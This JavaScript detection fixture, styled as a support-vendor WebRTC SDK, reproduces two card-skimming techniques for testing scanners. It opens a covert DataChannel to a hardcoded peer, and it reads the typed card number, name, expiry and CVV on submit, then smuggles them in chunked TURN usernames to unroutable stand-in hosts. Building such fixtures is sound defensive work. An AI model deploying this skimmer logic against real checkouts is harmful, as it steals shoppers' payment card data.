/*
 * Assist SDK — real-time transport module.
 *
 * Shaped like a support vendor's WebRTC transport (live co-browse / voice assist): it opens
 * RTCPeerConnections and a data channel on the checkout page. In reality this reproduces the two
 * published WebRTC card-skimmer techniques so a WebRTC-aware scanner has something to flag:
 *
 *   Attack A  DataChannel transport (Sansec): a self-written SDP naming a hardcoded peer, so no
 *             signalling server is involved. The covert channel to an external peer is the risk.
 *   Attack B  TURN credential smuggling (Source Defense): a payload hidden in the TURN username,
 *             chunked across several connections. The browser hands it over during ICE gathering.
 *
 * BOUNDS — load-bearing, do not relax:
 *   - The smuggled content is the card data actually typed into the checkout form, read on submit.
 *     It cannot leave the machine: every destination below is unroutable.
 *   - Every address is RFC 5737 documentation space or a .invalid host (RFC 2606): unroutable, so
 *     no connection ever completes and nothing can leave the machine. The calls are fully visible
 *     to a sensor; that visibility is the whole point.
 *   - No obfuscation, no eval, no storage writes. Attack A's "run the payload" step is a no-op.
 *
 * Observation: window.__SS_RTC__.attacks() / .peers() / .chunks() / .stats(), or the failing
 * connection attempts in the Network tab.
 */
(function () {
  'use strict';

  var VERSION = '1.0.0';
  var self = document.currentScript;

  if (window.__SS_RTC__) {
    return;
  }

  var cfg =
    typeof window.__ssReadConfig === 'function'
      ? window.__ssReadConfig(self)
      : (function () {
          var first = window.location.pathname.split('/').filter(Boolean)[0];
          var known = ['retail', 'insurance', 'bank', 'healthcare'];
          return {
            flavor: known.indexOf(first) !== -1 ? first : 'retail',
            siteId: '',
            ctx: 'app',
            debug: /(?:^|[?&])ssdebug=1/.test(window.location.search),
          };
        })();

  // rtcmode selects which attack(s) run, for demos: a | b | both. __ssReadConfig does not surface
  // arbitrary query keys, so read it from the tag's own src / dataset, then location.
  var mode = (function () {
    var data = (self && self.dataset) || {};
    if (data.ssRtcMode) return String(data.ssRtcMode).toLowerCase();
    try {
      if (self && self.src) {
        var q = new URL(self.src, window.location.href).searchParams.get('rtcmode');
        if (q) return String(q).toLowerCase();
      }
    } catch (err) {
      /* ignore */
    }
    var loc = /(?:^|[?&])rtcmode=([a-z]+)/i.exec(window.location.search);
    return loc ? loc[1].toLowerCase() : 'both';
  })();

  // The only content that ever rides the channels: the checkout form as the shopper filled it in.
  // Attack B smuggles this; attack A carries nothing at all.
  function fieldValue(id) {
    var el = document.getElementById(id);
    return el ? String(el.value || '').trim() : '';
  }

  function readCardData() {
    var pan = fieldValue('cardNumber').replace(/\s/g, '');
    var name = fieldValue('cardName');
    var cvv = fieldValue('cvv');
    if (!pan && !name && !cvv) {
      return '';
    }
    return [pan, name, fieldValue('expiryMonth') + '/' + fieldValue('expiryYear'), cvv].join('|');
  }

  // Attacker infrastructure — all unroutable. The real Sansec campaign used 202.181.177.177:3479;
  // this uses RFC 5737 documentation space instead so no live malicious address ships in the repo.
  var PEER_A_IP = '203.0.113.7';
  var PEER_A_PORT = '3479';
  var LATE_CANDIDATE_IP = '203.0.113.8';
  var LATE_CANDIDATE_PORT = '19302';
  var TURN_HOST = 'harvest.assist-rtc.invalid';
  var TURN_HOST_ALT = 'harvest2.assist-rtc.invalid';

  var state = { mode: mode, fired: false, attacks: [], peers: [], chunks: [], connections: 0, channel: null, endedAt: 0 };

  function log() {
    if (cfg.debug && window.console) {
      console.log.apply(console, ['[ss-rtc]'].concat([].slice.call(arguments)));
    }
  }

  function swallow() {}

  var openConnections = [];
  function track(pc) {
    openConnections.push(pc);
    state.connections += 1;
    return pc;
  }

  // Nothing is closed on a timer. A real DataChannel skimmer holds its channel open for the whole
  // life of the checkout — it needs it to receive the payload and push cards out as they are typed
  // — so a fixture that tore it down after a second would present a risk no attacker could use.
  // It closes when the checkout ends (see watchCheckoutEnd) or manually via __SS_RTC__.close().
  function closeAll() {
    for (var i = 0; i < openConnections.length; i += 1) {
      try {
        openConnections[i].close();
      } catch (err) {
        /* ignore */
      }
    }
    openConnections = [];
  }

  // No media lines, a hardcoded public address: a data-only session, not a real negotiation.
  var CANNED_SDP = [
    'v=0',
    'o=- 4611731400430051336 2 IN IP4 127.0.0.1',
    's=-',
    't=0 0',
    'a=group:BUNDLE 0',
    'm=application 9 UDP/DTLS/SCTP webrtc-datachannel',
    'c=IN IP4 0.0.0.0',
    // The payload: where the attacker wants the browser to connect.
    'a=candidate:1 1 UDP 2113937151 ' + PEER_A_IP + ' ' + PEER_A_PORT + ' typ host',
    // Login details invented by the attacker, who controls both ends.
    'a=ice-ufrag:Xk9v',
    'a=ice-pwd:9mQ2rTz8Lp0YwC3nHb7Vd1Kj',
    'a=ice-options:trickle',
    'a=fingerprint:sha-256 ' +
      'AB:CD:EF:01:23:45:67:89:AB:CD:EF:01:23:45:67:89:' +
      'AB:CD:EF:01:23:45:67:89:AB:CD:EF:01:23:45:67:89',
    'a=setup:actpass',
    'a=mid:0',
    'a=sctp-port:5000',
    'a=max-message-size:262144',
    '',
  ].join('\r\n');

  // Technique A — opens the covert DataChannel a skimmer would carry its payload and cards over.
  // The channel is stood up; nothing is read from the page and nothing is sent.
  function openDataChannelRisk() {
    try {
      // Empty config: no relay servers at all. A genuine app almost always configures one, so the
      // absence is itself a signal.
      var pc = track(new RTCPeerConnection());

      // Channel label = the page URL, exactly as the real campaign does, so the attacker knows
      // which checkout each victim came from.
      var dc = pc.createDataChannel(window.location.href);

      dc.onmessage = function () {
        // The real skimmer executes JS delivered here (nonce copy / Function() / <script> append).
        // Deliberately a no-op: this fixture creates the risk factor, it does not run a payload.
      };

      // The single most important call: the attacker's address exists here and nowhere else.
      pc.setRemoteDescription({ type: 'offer', sdp: CANNED_SDP }).catch(swallow);

      // The same address via trickle ICE — proves a hook must cover this route too.
      pc.addIceCandidate({
        candidate:
          'candidate:2 1 UDP 1677729535 ' +
          LATE_CANDIDATE_IP +
          ' ' +
          LATE_CANDIDATE_PORT +
          ' typ srflx raddr 0.0.0.0 rport 0',
        sdpMid: '0',
        sdpMLineIndex: 0,
      }).catch(swallow);

      // Left open: this is the channel the skimmer would live on for the whole checkout.
      state.channel = dc;

      state.peers.push(PEER_A_IP + ':' + PEER_A_PORT);
      state.peers.push(LATE_CANDIDATE_IP + ':' + LATE_CANDIDATE_PORT);
      state.attacks.push({
        attack: 'A',
        kind: 'datachannel',
        peer: PEER_A_IP + ':' + PEER_A_PORT,
        label: window.location.href,
      });
      log('risk A exposed: data channel open to', PEER_A_IP + ':' + PEER_A_PORT);
    } catch (err) {
      log('risk A failed to open', err);
    }
  }

  // Technique B — configures the attacker-controlled TURN relay and the chunked-username channel
  // a skimmer would smuggle cards through. The fields are empty when the form first renders, so
  // the relays are only stood up once there is something in them: on submit, as the real one does.
  function openTurnCredentialRisk() {
    var payload = readCardData();
    if (!payload) {
      document.addEventListener('submit', function onSubmit() {
        document.removeEventListener('submit', onSubmit, true);
        openTurnCredentialRisk();
      }, true);
      return;
    }
    try {
      var encoded = btoa(payload);
      // Browsers cap the username near 512 bytes, so a real checkout is spread across several
      // connections. Small chunks here make that "re-auth per chunk" pattern obvious.
      var chunkSize = 16;
      var chunks = [];
      for (var i = 0; i < encoded.length; i += chunkSize) {
        chunks.push(encoded.slice(i, i + chunkSize));
      }

      chunks.forEach(function (chunk, idx) {
        try {
          var username = 'x' + idx + '.' + chunk;
          var pc = track(
            new RTCPeerConnection({
              iceServers: [
                {
                  urls: 'turn:' + TURN_HOST + ':443?transport=tcp',
                  username: username, // not a username — this IS the smuggled data
                  credential: 's3cr3t',
                },
              ],
            })
          );
          // Opening a channel and describing our own side is what makes the browser start looking
          // for routes — and that is when it logs into the relay, handing over the "username".
          pc.createDataChannel('c' + idx);
          pc.createOffer()
            .then(function (offer) {
              return pc.setLocalDescription(offer);
            })
            .catch(swallow);
          state.chunks.push(username);
        } catch (err) {
          /* ignore a single chunk */
        }
      });

      // The relay list can also be swapped in AFTER the connection is built. A hook watching only
      // the constructor would see nothing and miss this entirely.
      var late = track(new RTCPeerConnection());
      late.setConfiguration({
        iceServers: [
          {
            urls: 'turn:' + TURN_HOST_ALT + ':443?transport=tcp',
            username: 'late.' + btoa(fieldValue('cvv')),
            credential: 's3cr3t',
          },
        ],
      });

      state.peers.push(TURN_HOST + ':443');
      state.peers.push(TURN_HOST_ALT + ':443');
      state.attacks.push({
        attack: 'B',
        kind: 'turn-username',
        relay: TURN_HOST + ':443',
        chunks: chunks.length,
      });
      log('risk B exposed:', chunks.length, 'TURN username channels open to', TURN_HOST);
    } catch (err) {
      log('risk B failed to open', err);
    }
  }

  /** Stands up the risky WebRTC surface. Opens channels an attacker could use; steals nothing. */
  function exposeWebrtcRisk() {
    if (state.fired || typeof window.RTCPeerConnection !== 'function') {
      return;
    }
    state.fired = true;
    if (mode === 'a' || mode === 'both') {
      openDataChannelRisk();
    }
    if (mode === 'b' || mode === 'both') {
      openTurnCredentialRisk();
    }
    watchCheckoutEnd();
  }

  // The channel exists while there are card fields to skim. Once checkout is over — the fields are
  // replaced by the success message, or the modal unmounts — it has no purpose, so tear it down.
  // A page unload closes everything anyway; this covers the SPA case, where a client-side route
  // change would otherwise leave the connections alive across the rest of the site.
  function watchCheckoutEnd() {
    if (!window.MutationObserver || !document.body) {
      return;
    }
    // Only tear down once the field has actually been seen, so a mutation arriving before the
    // form finishes rendering cannot close the risk the instant it opens.
    var seen = !!document.getElementById('cardNumber');
    var observer = new MutationObserver(function () {
      if (document.getElementById('cardNumber')) {
        seen = true;
        return;
      }
      if (!seen) {
        return;
      }
      observer.disconnect();
      closeAll();
      state.endedAt = Date.now();
      log('checkout ended — risk closed');
    });
    observer.observe(document.body, { childList: true, subtree: true });
  }

  // Expose the risk on the checkout page. In the payment document itself (payment-demo.html) that
  // is on load; in the app shell the modal mounts the form later, so watch for it and open once it
  // appears. Where no checkout ever shows, the fixture stays dormant (global + banner only).
  function armCheckout() {
    if (cfg.ctx === 'payment' || document.getElementById('paymentForm') || document.getElementById('payment-iframe')) {
      exposeWebrtcRisk();
      return;
    }
    if (!window.MutationObserver || !document.body) {
      return;
    }
    var observer = new MutationObserver(function () {
      if (document.getElementById('paymentForm') || document.getElementById('payment-iframe')) {
        observer.disconnect();
        exposeWebrtcRisk();
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });
  }

  window.__SS_RTC__ = {
    version: VERSION,
    flavor: cfg.flavor,
    ctx: cfg.ctx,
    mode: mode,
    attacks: function () {
      if (window.console && console.table) {
        console.table(state.attacks);
      }
      return state.attacks;
    },
    peers: function () {
      return state.peers;
    },
    chunks: function () {
      return state.chunks;
    },
    stats: function () {
      return {
        version: VERSION,
        flavor: cfg.flavor,
        ctx: cfg.ctx,
        mode: mode,
        fired: state.fired,
        connections: state.connections,
        open: openConnections.filter(function (pc) {
          return pc.connectionState !== 'closed';
        }).length,
        channelState: state.channel ? state.channel.readyState : 'none',
        chunks: state.chunks.length,
        checkoutEnded: state.endedAt ? new Date(state.endedAt).toISOString() : false,
      };
    },
    /** Manual teardown — nothing closes on its own. */
    close: function () {
      closeAll();
      return 'closed';
    },
    dump: function () {
      return { attacks: state.attacks, peers: state.peers, chunks: state.chunks };
    },
  };

  document.documentElement.setAttribute('data-ss-rtc', '1');

  if (window.console) {
    console.info(
      '[ss-rtc] v' + VERSION + ' flavor=' + cfg.flavor + ' ctx=' + cfg.ctx + ' mode=' + mode +
        ' — window.__SS_RTC__.stats()'
    );
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', armCheckout);
  } else {
    armCheckout();
  }
})();
